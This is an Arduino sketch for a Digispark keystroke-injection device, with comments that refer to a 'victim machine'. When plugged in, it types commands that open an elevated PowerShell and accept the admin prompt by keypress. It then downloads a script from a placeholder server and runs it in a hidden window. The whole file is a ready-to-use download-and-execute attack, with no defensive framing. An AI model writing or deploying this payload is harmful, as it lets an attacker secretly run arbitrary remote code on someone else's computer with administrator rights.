// Triggers admin and executes following
// Downloads powershell script from server and execute it in hidden mode.
// Set 'Deleys' according to the performance of the victim machine.

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://server/scripts/script.ps1','script.ps1');");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell.exe -windowstyle hidden -File script.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    
  }
}
